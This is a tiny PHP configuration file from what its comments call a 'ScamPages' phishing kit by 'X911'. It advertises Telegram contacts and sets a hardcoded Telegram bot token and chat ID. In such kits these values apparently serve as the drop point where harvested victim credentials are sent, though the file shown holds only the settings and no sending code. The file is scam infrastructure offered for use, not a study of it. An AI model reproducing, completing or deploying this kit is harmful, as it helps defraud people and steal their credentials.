<?php
/// Coder By X911
/// Contact Me For More Original ScamPages
/// X911 Group https://t.me/X911_tools
/// X911 Contact https://t.me/Code_x911


// INFO TELEGRAM
$token = "5600546959995:AAEYrjozABamQ7a7ZrISTERCttjV70O43Omstc";
$chat_id = "-406924637192";

?>